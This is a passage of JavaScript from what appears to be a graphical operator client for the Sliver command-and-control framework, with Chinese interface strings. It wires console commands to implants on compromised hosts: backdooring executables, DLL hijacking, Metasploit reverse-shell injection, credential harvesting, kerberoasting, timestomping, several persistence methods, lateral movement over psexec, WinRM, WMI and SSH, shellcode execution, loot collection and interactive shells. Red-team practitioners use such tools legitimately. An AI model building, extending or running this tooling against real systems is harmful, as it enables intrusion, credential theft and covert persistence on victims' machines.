      if (args.length < 2) return appendOut(id, 'usage: setenv <KEY> <VALUE>', 'err');
      await App().SetEnvVar(id, args[0], args.slice(1).join(' '));
      return appendOut(id, `[+] ${args[0]} set`, 'out');
    }
    case 'unsetenv': {
      if (!args[0]) return appendOut(id, 'usage: unsetenv <KEY>', 'err');
      await App().UnsetEnvVar(id, args[0]);
      return appendOut(id, `[+] ${args[0]} unset`, 'out');
    }
    case 'getenv': {
      const vars = await App().GetEnvVars(id);
      const filtered = args[0] ? vars.filter(v => v.key.toLowerCase().includes(args[0].toLowerCase())) : vars;
      return appendOut(id, filtered.map(v => `${v.key}=${v.value}`).join('\n') || '[*] no match', 'out');
    }
    case 'reg': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'query') {
        if (!args[1]) return appendOut(id, 'usage: reg query <HIVE> <path>  (HIVE: HKLM HKCU HKCR HKU HKCC)', 'err');
        const vals = await App().RegistryListValues(id, args[1], args.slice(2).join(' '));
        let out = 'NAME                 TYPE        VALUE\n';
        vals.forEach(v => { out += `${(v.name||'(default)').slice(0,20).padEnd(21)}${(v.type||'').padEnd(12)}${v.value||''}\n`; });
        return appendOut(id, out.trimEnd(), 'out');
      }
      if (sub === 'read') { const v = await App().RegistryReadValue(id, args[1], args[2], args[3]); return appendOut(id, v, 'out'); }
      if (sub === 'write') { await App().RegistryWriteValue(id, args[1], args[2], args[3], args.slice(4).join(' ')); return appendOut(id, '[+] value written', 'out'); }
      if (sub === 'read-hive') {
        if (!args[1]) return appendOut(id, 'usage: reg read-hive <ROOT_HIVE> [requested_hive]', 'err');
        const p = await App().RegistryReadHiveExport(id, args[1], args[2]||'');
        return appendOut(id, `[+] hive saved to ${p}`, 'out');
      }
      return appendOut(id, 'usage: reg query|read|write|read-hive <HIVE> <path> [key] [value]', 'err');
    }
    case 'execute': {
      // execute [-o|-e|-t|-s ...] <path> [args] — run a program directly (no shell)
      const rest = args.filter(a => !a.startsWith('-'));
      if (!rest.length) return appendOut(id, 'usage: execute [-o] <path> [args...]', 'err');
      const r = await App().RunExecute(id, rest[0], rest.slice(1));
      if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
      if (r.stdout) appendOut(id, r.stdout.trimEnd(), 'out');
      if (r.stderr) appendOut(id, r.stderr.trimEnd(), 'err');
      if (r.status && r.status !== 0) appendOut(id, `[exit ${r.status}]`, 'err');
      return;
    }
    case 'cat': {
      if (!args[0]) return appendOut(id, 'usage: cat <remote_path>', 'err');
      const txt = await App().ReadRemoteFile(id, args.join(' '));
      return appendOut(id, txt || '(empty file)', 'out');
    }
    case 'mv': {
      if (args.length < 2) return appendOut(id, 'usage: mv <src> <dst>', 'err');
      await App().MoveFile(id, args[0], args[1]);
      return appendOut(id, `[+] ${args[0]} -> ${args[1]}`, 'out');
    }
    case 'cp': {
      if (args.length < 2) return appendOut(id, 'usage: cp <src> <dst>', 'err');
      const n = await App().CopyFile(id, args[0], args[1]);
      return appendOut(id, `[+] copied ${fmtSize(n)} ${args[0]} -> ${args[1]}`, 'out');
    }
    case 'ifconfig': case 'ipconfig': {
      const ifs = await App().Ifconfig(id);
      let out = '';
      ifs.forEach(i => { out += `${i.name}${i.mac ? '  ('+i.mac+')' : ''}\n${(i.ips||[]).map(a => '    '+a).join('\n')}\n`; });
      return appendOut(id, out.trimEnd() || '(no interfaces)', 'out');
    }
    case 'getprivs': {
      const r = await App().GetPrivs(id);
      let out = `Process: ${r.processName}   Integrity: ${r.integrity}\n\nPRIVILEGE                          ENABLED\n`;
      (r.privs||[]).forEach(p => { out += `${(p.name||'').padEnd(35)}${p.enabled ? 'yes' : 'no'}\n`; });
      return appendOut(id, out.trimEnd(), 'out');
    }
    case 'procdump': {
      if (!args[0]) return appendOut(id, 'usage: procdump <pid>', 'err');
      appendOut(id, '[*] dumping process memory...', 'pending');
      const r = await App().ProcessDump(id, parseInt(args[0]));
      return appendOut(id, r.error ? `[error] ${r.error}` : `[+] dumped ${fmtSize(r.bytes)} -> ${r.path}`, r.error?'err':'out');
    }
    case 'extensions': case 'ext-list': {
      const installed = await App().ListInstalledExtensions().catch(() => []);
      const loaded = await App().ListImplantExtensions(id).catch(() => []);
      let out = 'INSTALLED COMMANDS  (run with:  ext <command> [args...])\n';
      if (!installed.length) out += '  (none installed — use the Sliver CLI: armory install <name>)\n';
      installed.forEach(e => out += `  ${(e.command||'').padEnd(20)}${e.isBof?'[BOF] ':'      '}${e.args||''}${e.help?('  — '+e.help):''}\n`);
      out += `\nLOADED IN THIS IMPLANT:  ${loaded && loaded.length ? loaded.join(', ') : '(none yet)'}`;
      return appendOut(id, out, 'out');
    }
    case 'ext': {
      if (!args[0]) return appendOut(id, 'usage: ext <command> [args...]   (list them with: extensions)', 'err');
      appendOut(id, `[*] running extension '${args[0]}'...`, 'pending');
      const r = await App().RunExtension(id, args[0], args.slice(1)).then(o => ({ o })).catch(e => ({ err: String(e) }));
      if (r.err) return appendOut(id, `[error] ${r.err}`, 'err');
      return appendOut(id, (r.o && r.o.trim()) ? r.o.trimEnd() : '[+] executed (no output)', 'out');
    }
    case 'backdoor': {
      if (args.length < 2) return appendOut(id, 'usage: backdoor <remote_pe_path> <profile>', 'err');
      const err = await App().Backdoor(id, args[0], args[1]).then(()=>null).catch(e=>String(e));
      return appendOut(id, err ? `[error] ${err}` : `[+] backdoored ${args[0]} with profile ${args[1]}`, err?'err':'out');
    }
    case 'dllhijack': {
      if (args.length < 3) return appendOut(id, 'usage: dllhijack <reference_dll> <target_location> <profile>', 'err');
      const err = await App().DllHijack(id, args[0], args[1], args[2]).then(()=>null).catch(e=>String(e));
      return appendOut(id, err ? `[error] ${err}` : `[+] DLL hijack planted at ${args[1]}`, err?'err':'out');
    }
    case 'msf': {
      if (args.length < 3) return appendOut(id, 'usage: msf <payload> <lhost> <lport>   (e.g. windows/x64/meterpreter/reverse_tcp)', 'err');
      const err = await App().MsfInject(id, args[0], args[1], parseInt(args[2])).then(()=>null).catch(e=>String(e));
      return appendOut(id, err ? `[error] ${err}` : '[+] msf payload staged into the implant process', err?'err':'out');
    }
    case 'msf-inject': {
      if (args.length < 4) return appendOut(id, 'usage: msf-inject <payload> <lhost> <lport> <pid>', 'err');
      const err = await App().MsfRemoteInject(id, args[0], args[1], parseInt(args[2]), parseInt(args[3])).then(()=>null).catch(e=>String(e));
      return appendOut(id, err ? `[error] ${err}` : `[+] msf payload injected into PID ${args[3]}`, err?'err':'out');
    }
    case 'wg-portfwd': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'add') { await App().WGStartPortForward(id, parseInt(args[1]), args[2]); return appendOut(id, `[+] WG forward 127.0.0.1:${args[1]} -> ${args[2]}`, 'out'); }
      if (sub === 'rm')  { if (!(await uiConfirm(`确定停止 WireGuard 转发 ${esc(args[1])} 吗？`, { title:'停止 WireGuard 转发', okLabel:'停止', danger:true }))) return; await App().WGStopPortForward(id, parseInt(args[1])); return appendOut(id, `[+] WG forward ${args[1]} stopped`, 'out'); }
      return appendOut(id, 'usage: wg-portfwd add <lport> <remoteHost:port> | rm <id>', 'err');
    }
    case 'wg-socks': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'stop') { if (!(await uiConfirm(`确定停止 WireGuard SOCKS ${esc(args[1])} 吗？`, { title:'停止 WireGuard SOCKS', okLabel:'停止', danger:true }))) return; await App().WGStopSocks(id, parseInt(args[1])); return appendOut(id, `[+] WG socks ${args[1]} stopped`, 'out'); }
      await App().WGStartSocks(id, parseInt(args[0])||1081);
      return appendOut(id, `[+] WG SOCKS proxy on 127.0.0.1:${parseInt(args[0])||1081}`, 'out');
    }
    case 'loot': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'add') {
        if (!args[1]) return appendOut(id, 'usage: loot add <remote_path>', 'err');
        appendOut(id, `[*] looting ${args[1]}...`, 'pending');
        const err = await App().LootFile(id, args.slice(1).join(' ')).then(() => null).catch(e => String(e));
        return appendOut(id, err ? `[error] ${err}` : `[+] added ${args[1]} to the shared loot store`, err?'err':'out');
      }
      if (sub === 'rm') { if (!args[1]) return appendOut(id, 'usage: loot rm <id>', 'err'); if (!(await uiConfirm(`确定删除战利品 ${esc(args[1])} 吗？`, { title:'删除战利品', okLabel:'删除', danger:true }))) return; await App().DeleteLoot(args[1]); return appendOut(id, `[+] loot ${args[1]} removed`, 'out'); }
      const loot = await App().GetLoot().catch(() => []);
      if (!loot.length) return appendOut(id, '[*] loot store is empty (use: loot add <remote_path>)', 'info');
      let out = 'ID            TYPE        NAME\n';
      loot.forEach(l => { out += `${(l.id||'').slice(0,12).padEnd(14)}${(l.type||'').padEnd(12)}${l.name||''}\n`; });
      return appendOut(id, out.trimEnd(), 'out');
    }
    case 'runas': {
      let user='', pass='', dom='', rest=[];
      for (let i=0;i<args.length;i++){ if(args[i]==='-u')user=args[++i]||''; else if(args[i]==='-p')pass=args[++i]||''; else if(args[i]==='-d')dom=args[++i]||''; else rest.push(args[i]); }
      if(!user || !rest.length) return appendOut(id, 'usage: runas -u [DOMAIN\\]<user> [-p <pass>] <program> [args]', 'err');
      // Split DOMAIN\user (or user@domain) into separate domain + username.
      if (user.includes('\\')) { const p = user.split('\\'); dom = dom || p[0]; user = p[1]; }
      else if (user.includes('@')) { const p = user.split('@'); user = p[0]; dom = dom || p[1]; }
      if (!dom) dom = '.';   // local account
      const outp = await App().RunAs(id, user, dom, pass, rest[0], rest.slice(1).join(' '));
      return appendOut(id, outp || '[+] done', 'out');
    }
    case 'migrate': {
      if (args.length < 2) return appendOut(id, 'usage: migrate <pid> <profile>  (profile = a saved implant profile)', 'err');
      const err = await App().Migrate(id, parseInt(args[0]), args[1]).then(()=>null).catch(e=>String(e));
      return appendOut(id, err ? `[error] ${err}` : `[+] migration into PID ${args[0]} requested`, err?'err':'out');
    }
    case 'execute-shellcode': {
      // execute-shellcode <local-path> [pid]   (no path = file dialog)
      appendOut(id, args.length ? `[*] injecting ${args[0]}...` : '[*] no path given — opening file dialog...', 'pending');
      const r = await App().ExecuteShellcode(id, args[0] || '', parseInt(args[1])||0);
      return appendOut(id, r.error ? `[error] ${r.error}` : (r.output||'[+] done'), r.error?'err':'out');
    }
    case 'spawndll': {
      // spawndll <local-path> [args]   (no path = file dialog)
      appendOut(id, args.length ? `[*] spawning ${args[0]}...` : '[*] no path given — opening file dialog...', 'pending');
      const r = await App().SpawnDll(id, args[0] || '', args.slice(1).join(' '), '');
      return appendOut(id, r.error ? `[error] ${r.error}` : (r.output||'[+] done'), r.error?'err':'out');
    }
    case 'chmod': { if (args.length < 2) return appendOut(id, 'usage: chmod <path> <mode>  (e.g. 0755)', 'err'); await App().Chmod(id, args[0], args[1]); return appendOut(id, `[+] chmod ${args[1]} ${args[0]}`, 'out'); }
    case 'chown': { if (args.length < 3) return appendOut(id, 'usage: chown <path> <uid> <gid>', 'err'); await App().Chown(id, args[0], args[1], args[2]); return appendOut(id, `[+] chown ${args[1]}:${args[2]} ${args[0]}`, 'out'); }
    case 'chtimes': case 'timestomp': {
      if (args.length < 2) return appendOut(id, 'usage: chtimes <path> <YYYY-MM-DD HH:MM:SS>', 'err');
      const ts = Math.floor(new Date(args.slice(1).join(' ')).getTime()/1000);
      if (isNaN(ts)) return appendOut(id, 'invalid date — use e.g. 2021-01-01 09:00:00', 'err');
      await App().Chtimes(id, args[0], ts, ts);
      return appendOut(id, `[+] timestomped ${args[0]} -> ${args.slice(1).join(' ')}`, 'out');
    }
    case 'rportfwd': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'add') { await App().StartRportFwd(id, '0.0.0.0', parseInt(args[1]), args[2], parseInt(args[3])); return appendOut(id, `[+] reverse forward: target :${args[1]} -> ${args[2]}:${args[3]}`, 'out'); }
      if (sub === 'rm') { if (!(await uiConfirm(`确定停止反向端口转发 ${esc(args[1])} 吗？`, { title:'停止反向端口转发', okLabel:'停止', danger:true }))) return; await App().StopRportFwd(id, parseInt(args[1])); return appendOut(id, `[+] removed reverse forward ${args[1]}`, 'out'); }
      const fwds = await App().ListRportFwds(id);
      return appendOut(id, fwds.length ? fwds.map(f => `#${f.id} ${f.bind} -> ${f.forward}`).join('\n') : '[*] no reverse port forwards', 'info');
    }
    case 'getpid': return appendOut(id, String(tab.obj.pid), 'out');
    case 'getuid': case 'getgid': return dispatchCmd(kind, id, 'whoami');
    // ── Script commands (spawn / jump / persist / harvest / scan) ──
    case 'spawn': case 'jump': {
      // TWO modes:
      // 1) Local spawn (no creds): spawn <os> <arch> <listener_type>
      //    e.g. spawn windows x64 http
      //    e.g. spawn linux x64 mtls
      // 2) Remote spawn (with target): spawn linux user@host -p pass listener_url
      //    e.g. spawn linux root@192.168.50.20 -p toor mtls://...

      const sub = args[0] || '';

      // Detect mode: if no '@' in any arg and sub is an OS name → LOCAL spawn
      const hasTarget = args.some(a => a.includes('@'));
      const isLocalSpawn = !hasTarget && (sub === 'windows' || sub === 'linux' || sub === 'win' || sub === 'lin') && cmd === 'spawn';

      if (isLocalSpawn) {
        // spawn <os> <arch> <profile_name>
        const osTarget = (sub === 'win') ? 'windows' : sub;
        const archVal = args[1] || 'x64';
        const profile = args[2] || '';
        if (!profile) return appendOut(id, `usage: spawn ${osTarget} ${archVal} <profile_name>\n\nCreate a profile first:\n  Profiles panel → Create\n  Or: profiles new --mtls host:port --os ${osTarget} --beacon --name my-profile`, 'err');
        appendOut(id, `[*] Spawning ${osTarget}/${archVal} from profile '${profile}' on current host...`, 'pending');
        const r = await App().ScriptSpawnLocal(id, osTarget, archVal, profile);
        if (!r.error) renderGraph();
        return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
      }

      // Remote spawn / jump
      let targetStr = args[1] || '';
      let pass = '';
      const pi2 = args.indexOf('-p');
      if (pi2 >= 0) { pass = args[pi2+1]||''; args.splice(pi2, 2); targetStr = args[1]||''; }
      const listenerUrl = args[args.length-1] || '';
      // Parse user@host:port
      let user = 'root', host = '', port = 22;
      if (targetStr.includes('@')) { const p = targetStr.split('@'); user = p[0]; const hp = p[1].split(':'); host = hp[0]; if (hp[1]) port = parseInt(hp[1]); }
      else { host = targetStr; }
      if (!host || !listenerUrl) return appendOut(id, `usage:\n  ${cmd} <os> <arch> <listener>  (local spawn)\n  ${cmd} linux|windows <user>@<host> [-p <pass>] <listener_url>  (remote)`, 'err');
      appendOut(id, `[*] ${cmd} ${sub} → ${user}@${host}:${port} via ${listenerUrl}`, 'pending');
      let r;
      if (sub === 'linux' || sub === 'ssh') {
        r = await App().ScriptSpawnLinux(id, host, port, user, pass, listenerUrl);
      } else if (sub === 'windows' || sub === 'psexec' || sub === 'psexec64') {
        r = await App().ScriptSpawnWindows(id, host, port, user, pass, listenerUrl);
      } else if (sub === 'winrm') {
        r = await App().ScriptWinRMExec(id, host, port, user, pass, listenerUrl);
      } else if (sub === 'wmi') {
        r = await App().ScriptWMIExec(id, host, port, user, pass, listenerUrl);
      } else {
        return appendOut(id, `unknown type: ${sub}. Use: linux, windows, ssh, psexec, winrm, wmi`, 'err');
      }
      if (!r.error) {
        // Every jump records lateral-move lineage (source → target) so the graph
        // shows where the operator moved from. The pivot is authoritative and the
        // wouldCycle guard in renderGraph prevents a jump from flipping a chain.
        if (host) recordJump(id, host);
        renderGraph();
      }
      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
    }
    case 'privesc-check': case 'privesc': {
      appendOut(id, '[*] Running privilege escalation checks...', 'pending');
      const os = (tab.obj && tab.obj.os || '').toLowerCase();
      const r = os.includes('windows') ? await App().ScriptWinPrivescCheck(id) : await App().ScriptPrivescCheck(id);
      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
    }
    case 'harvest': {
      appendOut(id, '[*] Harvesting credentials...', 'pending');
      const os = (tab.obj && tab.obj.os || '').toLowerCase();
      const r = os.includes('windows') ? await App().ScriptWinHarvestCreds(id) : await App().ScriptHarvestCreds(id);
      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
    }
    case 'ad-enum': case 'adenum': {
      appendOut(id, '[*] Enumerating Active Directory...', 'pending');
      const r = await App().ScriptADEnum(id);
      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
    }
    case 'local-enum': case 'localenum': {
      appendOut(id, '[*] Running local enumeration...', 'pending');
      const os = (tab.obj && tab.obj.os || '').toLowerCase();
      const r = os.includes('windows') ? await App().ScriptWinLocalEnum(id) : await App().ScriptPrivescCheck(id);
      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
    }
    case 'kerberoast': {
      appendOut(id, '[*] Kerberoasting...', 'pending');
      const r = await App().ScriptKerberoast(id);
      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
    }
    case 'persist': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'cron') { const r = await App().ScriptPersistCron(id, args.slice(1).join(' ')); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
      if (sub === 'reg') { const r = await App().ScriptPersistRegRun(id, args[2]||'', args[1]||''); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
      if (sub === 'schtask') { const r = await App().ScriptPersistSchedTask(id, args[2]||'', args[1]||''); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
      if (sub === 'service') { const r = await App().ScriptPersistService(id, args[2]||'', args[1]||''); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
      if (sub === 'ssh-key') { const r = await App().ScriptPersistSSHKey(id, args.slice(1).join(' '), 'root'); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
      if (sub === 'systemd') { const r = await App().ScriptPersistSystemd(id, args[1]||'', args[2]||''); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
      if (sub === 'wmi') { const r = await App().ScriptPersistWMI(id, args[1]||''); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
      if (sub === 'startup') { const r = await App().ScriptPersistStartup(id, args[1]||''); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
      return appendOut(id, 'usage: persist cron|reg|schtask|service|ssh-key|systemd|wmi|startup [args]', 'err');
    }
    case 'scan': {
      const subnet = args[0] || '192.168.50';
      const ports = args.slice(1).join(' ') || '22 445 3306 2375 3000 8080';
      appendOut(id, `[*] Scanning ${subnet}.0/24 ports: ${ports}...`, 'pending');
      const r = await App().ScriptNetworkScan(id, subnet, ports);
      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
    }
    default: {
      // Server/panel commands are not session commands — guide instead of
      // silently running them in cmd.exe.
      const serverCmds = { sessions:1, beacons:1, jobs:1, listeners:1, generate:1, profiles:1, builds:1, 'implant-builds':1, operators:1, hosts:1, use:1, background:1, players:1, 'new-operator':1 };
      if (serverCmds[cmd]) {
        return appendOut(id, `[!] '${cmd}' is a server/management command — use the toolbar at the top (this console runs commands on the target). Type 'help' for session commands, or 'shell ${raw}' to force an OS shell.`, 'err');
      }
      // Otherwise run it in the target's OS shell (cmd.exe / /bin/sh).
      const shellCmd = cmd === 'shell' ? args.join(' ') : raw;
      if (!shellCmd.trim()) return;
      const r = await App().ExecuteCommand(id, shellCmd).catch(e => ({ error: String(e) }));
      if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
      if (r.stdout) appendOut(id, r.stdout.trimEnd(), 'out');
      if (r.stderr) appendOut(id, r.stderr.trimEnd(), 'err');
      if (r.status && r.status !== 0) appendOut(id, `[exit ${r.status}]`, 'err');
      return;
    }
  }
}

// pollBeaconResult polls the beacon task queue until the given task completes,
// then prints its output. Non-blocking — the console stays usable meanwhile.
// It uses the task LIST to detect state (reliable), then fetches the full body
// via GetBeaconTaskResult only once the task is completed.
function pollBeaconResult(id, taskId, localTaskId, tries = 0) {
  const existing = beaconPolls.get(localTaskId);
  if (existing?.cancelled || taskStore.get(localTaskId)?.status === 'cancelled') return;
  if (!existing) beaconPolls.set(localTaskId, { cancelled: false });
  if (tries > 120) {
    beaconPolls.delete(localTaskId);
    taskStore.update(localTaskId, { status: 'waiting', summary: '主动轮询已超时，任务仍在 Teamserver 等待，可取消或稍后复查' });
    if (openTabs[id]) appendOut(id, `[*] task ${taskId.slice(0,8)} still pending — the beacon has not checked in yet (interval/jitter). Use 'tasks' to check later.`, 'pending');
    return;
  }
  setTimeout(async () => {
    if (beaconPolls.get(localTaskId)?.cancelled || taskStore.get(localTaskId)?.status === 'cancelled') return;
    const tasks = await App().GetBeaconTasks(id).catch(() => null);
    if (beaconPolls.get(localTaskId)?.cancelled || taskStore.get(localTaskId)?.status === 'cancelled') return;
    if (!tasks) { pollBeaconResult(id, taskId, localTaskId, tries + 1); return; }
    const t = tasks.find(x => x.id === taskId);
    if (!t) { pollBeaconResult(id, taskId, localTaskId, tries + 1); return; }
    if (t.state === 'completed') {
      const full = await App().GetBeaconTaskResult(taskId).catch(() => null);
      beaconPolls.delete(localTaskId);
      taskStore.update(localTaskId, { status: 'success', canCancel: false, summary: '命令已完成并返回结果' });
      if (openTabs[id]) {
        appendOut(id, `[+] task ${taskId.slice(0,8)} completed`, 'ok');
        appendOut(id, (((full && full.response) || t.response) || '(no output)').trimEnd(), 'out');
      }
    } else if (t.state === 'failed' || t.state === 'canceled') {
      const cancelled = t.state === 'canceled';
      const summary = cancelled ? '任务已取消' : 'Teamserver 报告任务失败';
      beaconPolls.delete(localTaskId);
      taskStore.update(localTaskId, { status: cancelled ? 'cancelled' : 'failed', canCancel: false, summary, error: summary });
      if (openTabs[id]) appendOut(id, `[error] task ${t.state}`, 'err');
    } else {
      pollBeaconResult(id, taskId, localTaskId, tries + 1);
    }
  }, 3000);
}

async function cancelTask(taskId) {
  const task = taskStore.get(taskId);
  if (!task?.canCancel) return;
  const confirmed = await uiConfirm(`取消“${esc(task.title)}”？`, {
    title: '取消任务', okLabel: '取消任务', danger: true,
  });
  if (!confirmed) return;
  taskStore.update(taskId, { canCancel: false, summary: '正在请求取消任务' });
  const cancelAction = taskActions.get(taskId)?.cancel;
  const error = await (cancelAction
    ? cancelAction().then(cancelled => cancelled ? null : new Error('任务已经结束')).catch(error => error)
    : App().CancelBeaconTask(task.remoteTaskId).then(() => null).catch(error => error));
  if (error) {
    taskStore.update(taskId, { canCancel: true, summary: RpcErrors.safeRpcErrorMessage(error, '取消任务失败') });
    toastRpcError(error, '取消任务失败');
    return;
  }
  const poll = beaconPolls.get(taskId);
  if (poll) poll.cancelled = true;
  beaconPolls.delete(taskId);
  taskActions.delete(taskId);
  taskStore.update(taskId, { status: 'cancelled', canCancel: false, summary: '已由操作员取消' });
  toast('ok', '任务已取消');
}

async function retryTask(taskId) {
  const task = taskStore.get(taskId);
  const action = taskActions.get(taskId)?.retry;
  if (!task?.canRetry || !action) return;
  taskStore.update(taskId, { canRetry: false });
  await action();
}

async function runFileTransfer(direction, sessionID, remotePath, options = {}) {
  const transferID = `transfer-${Date.now()}-${Math.random().toString(16).slice(2)}`;
  const target = openTabs[sessionID]?.obj?.hostname || sessionID.slice(0, 8);
  const title = direction === 'download' ? '下载文件' : '上传文件';
  const task = taskStore.create({
    id: transferID, type: `file-${direction}`, title, target, agentId: sessionID,
    status: 'running', canCancel: true,
    summary: direction === 'download' ? `正在等待目标返回：${remotePath}` : '正在选择并发送本地文件',
    policy: 'Sliver 文件 RPC 提供阶段状态但不提供字节流百分比；活动请求可真实取消。',
  });
  taskActions.set(task.id, { cancel: () => App().CancelTransfer(transferID) });
  const call = direction === 'download'
    ? App().DownloadFileTracked(transferID, sessionID, remotePath)
    : options.toDirectory
      ? App().UploadFileToDirectoryTracked(transferID, sessionID, remotePath)
      : App().UploadFileTracked(transferID, sessionID, remotePath);
  const result = await call.catch(error => ({ error: String(error) }));
  taskActions.delete(task.id);
  if (taskStore.get(task.id)?.status === 'cancelled') return result;
  if (result.error) {
    const info = rpcError(result.error, `${title}失败`);
    const cancelled = info.cancelled || /context canceled/i.test(String(result.error));
    taskStore.update(task.id, {
      status: cancelled ? 'cancelled' : 'failed', canCancel: false,
      summary: cancelled ? '传输已取消' : RpcErrors.safeRpcErrorMessage(result.error, `${title}失败`),
    });
  } else {
    taskStore.update(task.id, { status: 'success', canCancel: false, summary: `传输完成，共 ${fmtSize(result.bytes)}` });
  }
  return result;
}

async function showTasks(id) {
  const tasks = await App().GetBeaconTasks(id).catch(e => { appendOut(id, `[error] ${e}`, 'err'); return null; });
  if (!tasks) return;
  if (!tasks.length) { appendOut(id, '[*] no tasks in queue', 'info'); return; }
  let out = 'ID        State       Created   Completed  Description\n';
  out +=    '--------  ----------  --------  ---------  -----------\n';
  tasks.forEach(t => {
    out += `${(t.id||'').slice(0,8).padEnd(10)}${(t.state||'').padEnd(12)}${(t.createdAt||'').padEnd(10)}${(t.completedAt||'').padEnd(11)}${t.description||''}\n`;
    if (t.response && t.state === 'completed') out += `  > ${t.response.slice(0,200)}\n`;
  });
  appendOut(id, out.trimEnd(), 'out');
}

function fmtSize(b) { if (!b) return '0B'; if (b<1024) return b+'B'; if (b<1048576) return (b/1024).toFixed(1)+'K'; return (b/1048576).toFixed(1)+'M'; }
function appendImg(id, dataUrl) {
  const out = document.getElementById(`cout-${id}`); if (!out) return;
  const img = document.createElement('img'); img.src = dataUrl;
  img.style.cssText = 'max-width:100%;border:1px solid var(--border);border-radius:4px;margin:6px 0;display:block;';
  out.appendChild(img); out.scrollTop = out.scrollHeight;
}
function appendOut(id, text, cls) {
  const out = document.getElementById(`cout-${id}`); if (!out) return;
  const s = document.createElement('span'); s.className = cls||'out'; s.textContent = text + '\n';
  out.appendChild(s); out.scrollTop = out.scrollHeight;
}

// ── Interactive shell (real-time PTY over a tunnel) ─────────────────────────
// Opens as a pinned docked tab (named by machine), like the per-agent console
// and server console — not a floating popup.
async function openInteractiveShell(agentId, obj) {
  const host = obj ? (obj.hostname || obj.id.slice(0,8)) : agentId;
  const isWin = obj && (obj.os||'').toLowerCase().includes('windows');
  let tid;
  try {
    tid = await App().StartInteractiveShell(agentId, '', !isWin);  // '' = implant default shell
  } catch (e) {
    return appendOut(agentId, `[error] could not start shell: ${e}`, 'err');
  }

  const dockId = `shell-${tid}`;
  const evtOut = `sliver:shell:${tid}`, evtClose = `sliver:shell-closed:${tid}`;
  // Register as a shell tab so closeTab() can tear the tunnel down.
  openTabs[dockId] = { kind: 'shell', tid, evtOut, evtClose };
  document.getElementById('empty-interact')?.remove();

  // Tab: named by machine, with a shell glyph.
  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = dockId;
  tab.innerHTML = `<span>▸ ${esc(host)}</span><span class="close-x" data-cid="${dockId}">x</span>`;
  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(dockId); });
  document.getElementById('interact-tabs').appendChild(tab);

  // Panel: streaming output + input line.
  const outId = `sh-out-${tid}`, inId = `sh-in-${tid}`;
  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${dockId}`;
  panel.innerHTML =
    `<pre id="${outId}" class="shell-out"><span class="info">[*] ${esc(host)} 上的交互式 Shell - 输入 'exit' 或关闭标签页即可结束。\n</span></pre>
     <input id="${inId}" class="shell-in" placeholder="输入命令并按 Enter 执行..." autocomplete="off" spellcheck="false"/>`;
  document.getElementById('interact-panels').appendChild(panel);

  const outEl = document.getElementById(outId), inEl = document.getElementById(inId);
  const append = t => { if (!outEl) return; outEl.appendChild(document.createTextNode(t)); outEl.scrollTop = outEl.scrollHeight; };
  const onData = b64 => { try { append(decodeB64(b64)); } catch(e){} };
  const onClose = () => { append('\n[*] shell closed\n'); if (inEl) inEl.disabled = true; if (window.runtime){ window.runtime.EventsOff(evtOut); window.runtime.EventsOff(evtClose); } };
  if (window.runtime) { window.runtime.EventsOn(evtOut, onData); window.runtime.EventsOn(evtClose, onClose); }
  if (inEl) {
    inEl.addEventListener('keydown', async e => {
      if (e.key !== 'Enter') return;
      const line = inEl.value; inEl.value = '';
      if (line.trim() === 'exit') { await App().StopInteractiveShell(tid).catch(()=>{}); onClose(); return; }
      await App().SendShellData(tid, encodeB64(line + '\n')).catch(err => append(`\n[send error] ${err}\n`));
    });
  }
  activateTab(dockId);
  setTimeout(() => inEl && inEl.focus(), 30);
}
// UTF-8 safe base64 helpers for shell I/O.
function encodeB64(str){ return btoa(unescape(encodeURIComponent(str))); }
function decodeB64(b64){ return decodeURIComponent(escape(atob(b64))); }

// ── Toolbar nav (views in bottom panel for non-agent views) ────────────────
function closeToolbarMenus(focusTrigger = false) {
  document.querySelectorAll('.toolbar-menu.open').forEach(menu => {
    menu.classList.remove('open');
    const trigger = menu.querySelector('.toolbar-menu-trigger');
    trigger?.setAttribute('aria-expanded', 'false');
    if (focusTrigger) trigger?.focus();
  });
}

function markToolbarViewActive(view) {
  document.querySelectorAll('.tb-btn, .toolbar-menu-item').forEach(item => item.classList.remove('active'));
  const item = document.querySelector(`[data-view="${view}"]`);
  item?.classList.add('active');
  item?.closest('.toolbar-menu')?.querySelector('.toolbar-menu-trigger')?.classList.add('active');
}

function openToolbarView(view) {
  if (!view) return;
  closeToolbarMenus();
  markToolbarViewActive(view);
  if (view === 'sessions' || view === 'beacons') { hideModal(); selectAgentList(view); refreshAgents(); return; }
  if (view === 'listeners') openListenersPanel();
  if (view === 'tasks') openTaskCenter();
  if (view === 'generate') openGeneratePanel();
  if (view === 'builds') openBuildsPanel();
  if (view === 'profiles') openProfilesPanel();
  if (view === 'events') openEventsPanel();
  if (view === 'loot') openLootPanel();
  if (view === 'creds') openCredsPanel();
  if (view === 'hosts') openHostsPanel();
  if (view === 'operators') openOperatorsPanel();
  if (view === 'scripts') openScriptsPanel();
  if (view === 'iocs') openIOCPanel();
  if (view === 'report') exportReport();
